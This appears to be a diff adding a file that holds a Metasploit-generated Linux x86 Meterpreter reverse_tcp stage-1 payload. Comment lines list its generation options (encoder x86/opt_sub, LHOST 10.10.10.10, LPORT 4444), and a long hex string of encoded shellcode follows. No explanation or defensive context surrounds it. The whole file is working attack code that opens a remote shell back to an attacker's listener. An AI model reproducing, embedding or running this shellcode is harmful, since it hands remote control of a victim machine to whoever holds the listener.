@@ -1,0 +1,21 @@
+// linux/x86/meterpreter/reverse_tcp - 525 bytes (stage 1)
+// https://metasploit.com/
+// Encoder: x86/opt_sub
+// VERBOSE=false, LHOST=10.10.10.10, LPORT=4444, 
+// ReverseAllowProxy=false, ReverseListenerThreaded=false, 
+// StagerRetryCount=10, StagerRetryWait=5, AutoLoadStdapi=true, 
+// AutoVerifySession=true, AutoVerifySessionTimeout=30, 
+// InitialAutoRunScript=, AutoRunScript=, AutoSystemInfo=true, 
+// EnableUnicodeEncoding=false, SessionRetryTotal=3600, 
+// SessionRetryWait=10, SessionExpirationTimeout=604800, 
+// SessionCommunicationTimeout=300, PayloadProcessCommandLine=, 
+// AutoUnhookProcess=false, PingbackRetries=0, 
+// PingbackSleep=30, PayloadUUIDTracking=false, 
+// EnableStageEncoding=false, StageEncoderSaveRegisters=, 
+// StageEncodingFallback=true, PrependFork=false, 
+// PrependSetresuid=false, PrependSetreuid=false, 
+// PrependSetuid=false, PrependSetresgid=false, 
+// PrependSetregid=false, PrependSetgid=false, 
+// PrependChrootBreak=false, AppendExit=false, 
+// MeterpreterDebugLevel=0, RemoteMeterpreterDebugFile=
+54582d75fbfdfd2d010101012d01010101505c250101010125020202022dfefd307d2d010101012d01010101502dfe42c97e2d010101012d01010101502d46b7fffd2d010101012d01010101502d3efdfe1b2d010101012d01010101502da97f771f2d010101012d01010101502d1914d3ba2d010101012d01010101502d55dfcc672d010101012d01010101502dd4c666872d010101012d01010101502dd340a98d2d010101012d01010101502da2bae7712d010101012d01010101502d81db1f1f2d010101012d01010101502d87d1bfe92d010101012d01010101502dd75bf6442d010101012d01010101502d653648cb2d010101012d01010101502df5a93a642d010101012d01010101502dc2429b512d010101012d01010101502dab1ce1c52d010101012d01010101502db467fe672d010101012d01010101502d528ac0952d010101012d01010101502dc7b1c14c2d010101012d01010101502da27aaa962d010101012d01010101502d8ff073f52d010101012d01010101502d6de4ee2e2d010101012d01010101502ddf5708cd2d010101012d01010101502df404f2842d010101012d01010101502dad9f5bf62d010101012d01010101502d789887702d010101012d01010101502ddd1b180c2d010101012d01010101502dad6a111d2d010101012d01010101502d206659842d010101012d01010101502d9f6eeb832d010101012d0101010150
